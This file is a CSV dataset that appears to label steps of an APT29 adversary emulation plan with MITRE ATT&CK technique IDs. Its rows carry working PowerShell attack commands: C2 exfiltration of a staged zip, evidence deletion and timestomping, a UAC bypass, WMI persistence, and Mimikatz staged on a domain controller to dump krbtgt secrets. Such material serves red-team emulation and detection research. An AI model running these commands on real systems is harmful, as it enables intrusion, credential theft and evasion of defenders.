+apt29,apt29,unknown,apt29::107,107,Data from staged file (T1074) and Exfiltration over C2 Channel (T1041),"id: 2d18c8ec-4593-49dc-9bf4-11d0673d6ae6 | name: Data from staged file (T1074) and Exfiltration over C2 Channel (T1041) | description: Copy a target file from a remote file share through the existing C2 channel | tactic: exfiltration | technique: attack_id: T1041 | name: Exfiltration Over C2 Channel | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_exfiltration | procedure_step: 9.B.8 | platforms: windows: psh,pwsh: command: Import-Module .\upload.ps1 -Verbose -Force;
+Invoke-MultipartFormDataUpload -InFile ""C:\Users\#{profile_user}\Desktop\working.zip"" -Uri ""#{server}/file/upload"";
+ | cleanup: remove-item upload.ps1 -Force
+ | payloads: upload.ps1 | input_arguments: profile_user: description: Name of profile user | type: string | default: Administrator | server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Import-Module .\upload.ps1 -Verbose -Force;
+Invoke-MultipartFormDataUpload -InFile ""C:\Users\#{profile_user}\Desktop\working.zip"" -Uri ""#{server}/file/upload"";
+ | cleanup_command: remove-item upload.ps1 -Force
+","[""T1041"", ""T1074""]","[""T1041"", ""T1074""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::108,108,Exfiltration Over C2 Channel,attack_id: T1041 | name: Exfiltration Over C2 Channel,"[""T1041""]","[""T1041""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::109,109,Artifact Cleanup - Delete Staged Files,"id: 208b021b-c79a-4176-8ad1-3af99ed50c6f | name: Artifact Cleanup - Delete Staged Files | description: Cleanup files related to Operation | tactic: defensive-evasion | technique: attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion | cti_source: https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6ab66701-25d7-4685-ae9d-93d63708a11c&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments | procedure_group: procedure_def_evasion | procedure_step: 9.C | platforms: windows: psh,pwsh: command: if (!$(test-path -path ""C:\Program Files\SysInternalsSuite"")) {
+  mkdir ""C:\Program Files\SysInternalsSuite"";
+}
+set-location ""C:\Program Files\SysInternalsSuite"";
+
+if (!$(test-path -path ""sdelete64.exe"")) {
+  iwr -uri ""https://download.sysinternals.com/files/SDelete.zip"" -outfile sdelete64.zip;
+  Expand-Archive sdelete64.zip -force;
+}
+copy sdelete64.exe C:\Windows\Temp\;
+cd C:\Windows\Temp\ ;
+.\sdelete64.exe /accepteula C:\Windows\Temp\Rar.exe;
+.\sdelete64.exe /accepteula C:\Users\#{profile_user}\AppData\Roaming\working.zip;
+.\sdelete64.exe /accepteula C:\Users\#{profile_user}\Desktop\working.zip;
+remove-item C:\Windows\Temp\sdelete64.exe -force;
+ | input_arguments: profile_user: description: Name of profile user | type: string | default: Administrator | executors: name: powershell | command: if (!$(test-path -path ""C:\Program Files\SysInternalsSuite"")) {
+  mkdir ""C:\Program Files\SysInternalsSuite"";
+}
+set-location ""C:\Program Files\SysInternalsSuite"";
+
+if (!$(test-path -path ""sdelete64.exe"")) {
+  iwr -uri ""https://download.sysinternals.com/files/SDelete.zip"" -outfile sdelete64.zip;
+  Expand-Archive sdelete64.zip -force;
+}
+copy sdelete64.exe C:\Windows\Temp\;
+cd C:\Windows\Temp\ ;
+.\sdelete64.exe /accepteula C:\Windows\Temp\Rar.exe;
+.\sdelete64.exe /accepteula C:\Users\#{profile_user}\AppData\Roaming\working.zip;
+.\sdelete64.exe /accepteula C:\Users\#{profile_user}\Desktop\working.zip;
+remove-item C:\Windows\Temp\sdelete64.exe -force;
+","[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::110,110,Indicator Removal on Host: File Deletion,attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion,"[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::111,111,Scheduled Task,"id: 4b2e9574-b1a7-4b38-95b2-6054ded9c4fe | name: Scheduled Task | description: Reboot the machine to aid in peristence callbacks | tactic: impact | technique: attack_id: T1529 | name: System Shutdown/Reboot | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_impact | procedure_step: 10.A.2 | platforms: windows: psh,pwsh: command: write-host ""[*] Restarting Computer"";
+Restart-Computer -Force;
+ | executors: name: powershell | command: write-host ""[*] Restarting Computer"";
+Restart-Computer -Force;
+","[""T1529""]","[""T1529""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::112,112,System Shutdown/Reboot,attack_id: T1529 | name: System Shutdown/Reboot,"[""T1529""]","[""T1529""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::113,113,Artifact Cleanup,"id: 4bedbd9b-a570-4f9f-b78a-2f7f99ad5e92 | name: Artifact Cleanup | description: Delete file artifacts left from the operation. | tactic: defensive-evasion | technique: attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion | cti_source: https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6ab66701-25d7-4685-ae9d-93d63708a11c&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments | procedure_group: procedure_def_evasion | procedure_step: 10.A.3 | platforms: windows: psh,pwsh: command: Remove-Item -Path ""$env:USERPROFILE\Downloads\*.pfx"" -Force;
+Remove-Item -Path ""$env:USERPROFILE\Downloads\*.bmp"" -Force;
+Remove-Item -Path ""$env:USERPROFILE\Downloads\*.png"" -Force;
+if (test-path -path ""$env:APPDATA\OfficeSupplies.7z"") {
+    Remove-Item -Path ""$env:APPDATA\OfficeSupplies.7z"" -Force; write-host ""[+] Successfully removed OfficeSupplies.7z"";
+} else {
+    write-host ""[!] File did not exist to be removed!"";
+}
+
+if (get-job -name ""Keystrokes"" -ErrorAction SilentlyContinue) {
+    Remove-Job -Name ""Keystrokes"";
+    if ($?) {
+        write-host ""[+] Job \""Keystrokes\"" was remove."";
+    }
+} else {
+    write-host ""[!] Job \""Keystrokes\"" did not exist."";
+}
+
+if (get-job -Name ""Screenshot"" -ErrorAction SilentlyContinue) {
+    Remove-Job -Name ""Screenshot"" -Force;
+    write-host ""[+] Job \""screenshot\"" was removed."";
+} else {
+    write-host ""[*] Job \""screenshot\"" does not exist, thus was not removed."";
+}
+remove-item upload.ps1 -Force;
+ | executors: name: powershell | command: Remove-Item -Path ""$env:USERPROFILE\Downloads\*.pfx"" -Force;
+Remove-Item -Path ""$env:USERPROFILE\Downloads\*.bmp"" -Force;
+Remove-Item -Path ""$env:USERPROFILE\Downloads\*.png"" -Force;
+if (test-path -path ""$env:APPDATA\OfficeSupplies.7z"") {
+    Remove-Item -Path ""$env:APPDATA\OfficeSupplies.7z"" -Force; write-host ""[+] Successfully removed OfficeSupplies.7z"";
+} else {
+    write-host ""[!] File did not exist to be removed!"";
+}
+
+if (get-job -name ""Keystrokes"" -ErrorAction SilentlyContinue) {
+    Remove-Job -Name ""Keystrokes"";
+    if ($?) {
+        write-host ""[+] Job \""Keystrokes\"" was remove."";
+    }
+} else {
+    write-host ""[!] Job \""Keystrokes\"" did not exist."";
+}
+
+if (get-job -Name ""Screenshot"" -ErrorAction SilentlyContinue) {
+    Remove-Job -Name ""Screenshot"" -Force;
+    write-host ""[+] Job \""screenshot\"" was removed."";
+} else {
+    write-host ""[*] Job \""screenshot\"" does not exist, thus was not removed."";
+}
+remove-item upload.ps1 -Force;
+","[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::114,114,Indicator Removal on Host: File Deletion,attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion,"[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::115,115,Startup Folder Persistence Execution,"id: 00446217-53ca-4749-bacd-f41fe189d36e | name: Startup Folder Persistence Execution | description: Sets credentials for a headless RDP session to spawn triggering startup folder persistence. | tactic: lateral-movement | technique: attack_id: T1037.005 | name: Boot or Logon Initialization Scripts: Startup Items | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_lat_movement | procedure_step: 10.B | platforms: windows: psh,pwsh: command: cmdkey /add:127.0.0.2 /user:#{profile_user} /pass:#{profile_user_password};
+mstsc /v:127.0.0.2;
+sleep 10;
+Get-Process -name mstsc;
+if ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;}
+ | input_arguments: profile_user: description: Name of profile user | type: string | default: Administrator | profile_user_password: description: Password of profile user | type: string | default: Password123! | executors: name: powershell | command: cmdkey /add:127.0.0.2 /user:#{profile_user} /pass:#{profile_user_password};
+mstsc /v:127.0.0.2;
+sleep 10;
+Get-Process -name mstsc;
+if ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;}
+","[""T1037.005""]","[""T1037""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::116,116,Boot or Logon Initialization Scripts: Startup Items,attack_id: T1037.005 | name: Boot or Logon Initialization Scripts: Startup Items,"[""T1037.005""]","[""T1037""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::117,117,Click .LNK payload,"id: e506f811-884d-4992-aacb-514b33a0324f | name: Click .LNK payload | description: Execute PowerShell collection command to collect and compress files of specific extensions. | tactic: execution | technique: attack_id: T1204.002 | name: User Execution: Malicious File | cti_source: https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html | procedure_group: procedure_execution | procedure_step: 11.A | platforms: windows: psh,pwsh: command: Set-Location -Path ""C:\Users\#{profile_user_day2}\Desktop"";
+
+if(Test-Path -LiteralPath ""$env:appdata\Microsoft\kxwn.lock""){
+  Remove-Item ""$env:appdata\Microsoft\kxwn.lock"" -Force;
+  Write-Host ""Removed old kxwn.lock file"";
+}
+
+powershell.exe Get-Content '.\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX;
+ | cleanup: Remove-Item ""$env:appdata\Microsoft\kxwn.lock"" -Force;
+ | input_arguments: profile_user_day2: description: Name of profile user | type: string | default: Administrator | executors: name: powershell | command: Set-Location -Path ""C:\Users\#{profile_user_day2}\Desktop"";
+
+if(Test-Path -LiteralPath ""$env:appdata\Microsoft\kxwn.lock""){
+  Remove-Item ""$env:appdata\Microsoft\kxwn.lock"" -Force;
+  Write-Host ""Removed old kxwn.lock file"";
+}
+
+powershell.exe Get-Content '.\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX;
+ | cleanup_command: Remove-Item ""$env:appdata\Microsoft\kxwn.lock"" -Force;
+","[""T1204.002""]","[""T1204""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::118,118,User Execution: Malicious File,attack_id: T1204.002 | name: User Execution: Malicious File,"[""T1204.002""]","[""T1204""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::119,119,Timestomp kxwn.lock,"id: 4a2ad84e-a93a-4b2e-b1f0-c354d6a41278 | name: Timestomp kxwn.lock | description: Timestomp kxwn.lock | tactic: defensive-evasion | technique: attack_id: T1070.006 | name: Indicator Removal on Host: Timestomp | cti_source: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html | procedure_group: procedure_def_evasion | procedure_step: 12.A | platforms: windows: psh,pwsh: command: if (!(test-path -path ""$env:appdata\Microsoft\kxwn.lock"")) {
+  write-host ""[!] kxwn.lock was not found on this host."";
+  exit 1;
+} else {
+  . .\timestomp.ps1;
+  timestomp -dest ""$env:appdata\Microsoft\kxwn.lock"";
+}
+ | payloads: timestomp.ps1 | executors: name: powershell | command: if (!(test-path -path ""$env:appdata\Microsoft\kxwn.lock"")) {
+  write-host ""[!] kxwn.lock was not found on this host."";
+  exit 1;
+} else {
+  . .\timestomp.ps1;
+  timestomp -dest ""$env:appdata\Microsoft\kxwn.lock"";
+}
+","[""T1070.006""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::120,120,Indicator Removal on Host: Timestomp,attack_id: T1070.006 | name: Indicator Removal on Host: Timestomp,"[""T1070.006""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::121,121,Detect Anti-Virus,"id: f9c0b150-822f-497b-ad6d-187f24561e9a | name: Detect Anti-Virus | description: Detect anti-virus software on host | tactic: discovery | technique: attack_id: T1518.001 | name: Software Discovery: Security Software Discovery | cti_source: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html | procedure_group: procedure_discovery | procedure_step: 12.B | platforms: windows: psh,pwsh: command: . .\stepTwelve.ps1;
+detectav
+ | payloads: stepTwelve.ps1 | executors: name: powershell | command: . .\stepTwelve.ps1;
+detectav
+","[""T1518.001""]","[""T1518""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::122,122,Software Discovery: Security Software Discovery,attack_id: T1518.001 | name: Software Discovery: Security Software Discovery,"[""T1518.001""]","[""T1518""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::123,123,Detect Software,"id: 2b5a72b1-01e4-48ae-98b0-2570a7894371 | name: Detect Software | description: Detect software on host | tactic: discovery | technique: attack_id: T1518 | name: Software Discovery | cti_source: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html | procedure_group: procedure_discovery | procedure_step: 12.C | platforms: windows: psh,pwsh: command: . .\stepTwelve.ps1;
+software;
+ | payloads: stepTwelve.ps1 | executors: name: powershell | command: . .\stepTwelve.ps1;
+software;
+","[""T1518""]","[""T1518""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::124,124,Software Discovery,attack_id: T1518 | name: Software Discovery,"[""T1518""]","[""T1518""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::125,125,Enumerate Computer Name,"id: 0cfadbcb-ec21-44ae-adb7-9a23176dd620 | name: Enumerate Computer Name | description: Triage host for ComputerNameNetBIOS,ComputerNameDnsHostname,ComputerNameDnsDomain,ComputerNameDnsFullyQualified,ComputerNamePhysicalNetBIOS,ComputerNamePhysicalDnsHostname,ComputerNamePhysicalDnsDomain,ComputerNamePhysical,DnsFullyQualifie | tactic: discovery | technique: attack_id: T1082 | name: System Information Discovery | cti_source: https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/ | procedure_group: procedure_discovery | procedure_step: 13.A | platforms: windows: psh,pwsh: command: . .\stepThirteen.ps1;
+comp;
+ | payloads: stepThirteen.ps1 | executors: name: powershell | command: . .\stepThirteen.ps1;
+comp;
+","[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::126,126,System Information Discovery,attack_id: T1082 | name: System Information Discovery,"[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::127,127,Enumerate Domain Name,"id: 96140694-6d13-40b6-9553-0e63533469f3 | name: Enumerate Domain Name | description: Domain triage | tactic: discovery | technique: attack_id: T1082 | name: System Information Discovery | cti_source: https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/ | procedure_group: procedure_discovery | procedure_step: 13.B | platforms: windows: psh,pwsh: command: . .\stepThirteen.ps1;
+domain;
+ | payloads: stepThirteen.ps1 | executors: name: powershell | command: . .\stepThirteen.ps1;
+domain;
+","[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::128,128,System Information Discovery,attack_id: T1082 | name: System Information Discovery,"[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::129,129,Enumerate Username,"id: f320eebd-e75b-4194-b529-79e64ad0b9ee | name: Enumerate Username | description: user triage | tactic: discovery | technique: attack_id: T1033 | name: System Owner/User Discovery | cti_source: https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/ | procedure_group: procedure_discovery | procedure_step: 13.C | platforms: windows: psh,pwsh: command: . .\stepThirteen.ps1;
+user;
+ | payloads: stepThirteen.ps1 | executors: name: powershell | command: . .\stepThirteen.ps1;
+user;
+","[""T1033""]","[""T1033""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::130,130,System Owner/User Discovery,attack_id: T1033 | name: System Owner/User Discovery,"[""T1033""]","[""T1033""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::131,131,Enumerate Processes,"id: a34ab8f2-a106-41fb-af0b-cf5382bd18ae | name: Enumerate Processes | description: Process triage | tactic: discovery | technique: attack_id: T1057 | name: Process Discovery | cti_source: https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/ | procedure_group: procedure_discovery | procedure_step: 13.D | platforms: windows: psh,pwsh: command: . .\stepThirteen.ps1;
+pslist;
+ | payloads: stepThirteen.ps1 | executors: name: powershell | command: . .\stepThirteen.ps1;
+pslist;
+","[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::132,132,Process Discovery,attack_id: T1057 | name: Process Discovery,"[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::133,133,UAC Bypass via sdctl,"id: 5226e5dc-fc28-43b7-a679-0db49d520402 | name: UAC Bypass via sdctl | description: Invoke UAC bypass sdctl | tactic: defensive-evasion | technique: attack_id: T1134.002 | name: Access Token Manipulation: Create Process with Token | cti_source: https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016 | procedure_group: procedure_def_evasion | procedure_step: 14.A | platforms: windows: psh,pwsh: command: . .\stepFourteen_bypassUAC.ps1;
+bypass;
+ | payloads: stepFourteen_bypassUAC.ps1 | executors: name: powershell | command: . .\stepFourteen_bypassUAC.ps1;
+bypass;
+","[""T1134.002""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::134,134,Access Token Manipulation: Create Process with Token,attack_id: T1134.002 | name: Access Token Manipulation: Create Process with Token,"[""T1134.002""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::135,135,Credential Dumping,"id: 4ef6009d-2d62-4bb4-8de9-0458df2e9567 | name: Credential Dumping | description: Dumping credentials via wmidump (Mimikatz) | tactic: credential-access | technique: attack_id: T1003 | name: Credential Dumping | cti_source: https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/ | procedure_group: procedure_cred_access | procedure_step: 14.B | platforms: windows: psh,pwsh: command: . .\stepFourteen_credDump.ps1;
+ | payloads: stepFourteen_credDump.ps1 | executors: name: powershell | command: . .\stepFourteen_credDump.ps1;
+","[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::136,136,Credential Dumping,attack_id: T1003 | name: Credential Dumping,"[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::137,137,Stage Mimikatz Binary,"id: 1dba454c-0e4f-4fe0-8bc9-b17e8c5c9a24 | name: Stage Mimikatz Binary | description: Staging Mimikatz Binary for later execution | tactic: credential-access | technique: attack_id: T1003 | name: Credential Dumping | cti_source: https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/ | procedure_group: procedure_cred_access | procedure_step: 14.C | platforms: windows: psh,pwsh: command: write-host ""[+] Successfully downloaded m.exe"";
+ | payloads: m.exe | executors: name: powershell | command: write-host ""[+] Successfully downloaded m.exe"";
+","[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::138,138,Credential Dumping,attack_id: T1003 | name: Credential Dumping,"[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::139,139,WMI Persistence technique,"id: 43aad2d6-d16a-4adb-aa2b-9510a3be4c52 | name: WMI Persistence technique | description: user triage | tactic: persistence | technique: attack_id: T1546.003 | name: Event Triggered Execution: Windows Management Instrumentation Event Subscription | cti_source: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html | procedure_group: procedure_persistence | procedure_step: 15.A | platforms: windows: psh,pwsh: command: Get-WmiObject -Namespace ""root/subscription"" -list | findstr /i ""__Filter"";
+if ($?) {
+  write-host ""[*] WMI script has already executed on this machine. Not loading and executing wmi script."";
+  exit 1;
+} else {
+  . .\stepFifteen_wmi.ps1;
+  wmi;
+  if ($?) {
+    write-host ""[+] WMI script has successfully executed!"";
+    exit 0;
+  }
+  exit 1;
+}
+ | payloads: stepFifteen_wmi.ps1 | executors: name: powershell | command: Get-WmiObject -Namespace ""root/subscription"" -list | findstr /i ""__Filter"";
+if ($?) {
+  write-host ""[*] WMI script has already executed on this machine. Not loading and executing wmi script."";
+  exit 1;
+} else {
+  . .\stepFifteen_wmi.ps1;
+  wmi;
+  if ($?) {
+    write-host ""[+] WMI script has successfully executed!"";
+    exit 0;
+  }
+  exit 1;
+}
+","[""T1546.003""]","[""T1546""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::140,140,Event Triggered Execution: Windows Management Instrumentation Event Subscription,attack_id: T1546.003 | name: Event Triggered Execution: Windows Management Instrumentation Event Subscription,"[""T1546.003""]","[""T1546""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::141,141,Enumerate Domain Controller,"id: 1c8552c7-f7ed-4523-b640-72d65af5f855 | name: Enumerate Domain Controller | description: Get domain controller and current user SID for the domain | tactic: discovery | technique: attack_id: T1018 | name: Remote System Discovery | cti_source: https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/ | procedure_group: procedure_discovery | procedure_step: 16.A | platforms: windows: psh,pwsh: command: . .\powerview.ps1;
+get-netdomaincontroller;
+ | payloads: powerview.ps1 | executors: name: powershell | command: . .\powerview.ps1;
+get-netdomaincontroller;
+","[""T1018""]","[""T1018""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::142,142,Remote System Discovery,attack_id: T1018 | name: Remote System Discovery,"[""T1018""]","[""T1018""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::143,143,Enumerate Domain SID,"id: a42be479-fc26-4d7c-9e63-7a9b74e4c8d2 | name: Enumerate Domain SID | description: Get domain user SID | tactic: discovery | technique: attack_id: T1033 | name: System Owner/User Discovery | cti_source: https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/ | procedure_group: procedure_discovery | procedure_step: 16.B | platforms: windows: psh,pwsh: command: . .\stepSixteen_SID.ps1;
+siduser;
+ | payloads: stepSixteen_SID.ps1 | executors: name: powershell | command: . .\stepSixteen_SID.ps1;
+siduser;
+","[""T1033""]","[""T1033""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::144,144,System Owner/User Discovery,attack_id: T1033 | name: System Owner/User Discovery,"[""T1033""]","[""T1033""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::145,145,Remote Connection (T1028) & Remote File Copy (T1105) & Credential Dumping,"id: acecc8f7-18c2-41fd-87bc-39ffd644e4e9 | name: Remote Connection (T1028) & Remote File Copy (T1105) & Credential Dumping | description: Establish connection to Domain Controller | tactic: lateral-movement | technique: attack_id: T1105 | name: Ingress Tool Transfer | cti_source: https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/ | procedure_group: procedure_lat_movement | procedure_step: 16.C | platforms: windows: psh,pwsh: command: . .\invoke-winrmsession.ps1;
+$session = invoke-winrmsession -Username ""#{target.winrm.username}"" -Password ""#{target.winrm.password}"" -IPAddress ""#{target.winrm.remote_host}"";
+Copy-Item m.exe -Destination ""C:\Windows\System32\\"" -ToSession $session -force;
+if ($?) {
+  write-host ""[+] Successfully copied m.exe to remote host"";
+} else {
+  write-host ""[!] Error, copying and executing m.exe on remote host"";
+}
+Invoke-Command -Session $session -scriptblock {C:\Windows\System32\m.exe privilege::debug ""lsadump::lsa /inject /name:krbtgt"" exit} | out-string
+ | payloads: invoke-winrmsession.ps1 | m.exe | input_arguments: target.winrm.username: description: Username of winrm target | type: string | default: Administrator | target.winrm.password: description: Password for winrm target user | type: string | default: Password123! | target.winrm.remote_host: description: IP or Hostname of remote host | type: string | default: 192.0.2.20 | executors: name: powershell | command: . .\invoke-winrmsession.ps1;
+$session = invoke-winrmsession -Username ""#{target.winrm.username}"" -Password ""#{target.winrm.password}"" -IPAddress ""#{target.winrm.remote_host}"";
+Copy-Item m.exe -Destination ""C:\Windows\System32\\"" -ToSession $session -force;
+if ($?) {
+  write-host ""[+] Successfully copied m.exe to remote host"";
+} else {
+  write-host ""[!] Error, copying and executing m.exe on remote host"";
+}
+Invoke-Command -Session $session -scriptblock {C:\Windows\System32\m.exe privilege::debug ""lsadump::lsa /inject /name:krbtgt"" exit} | out-string
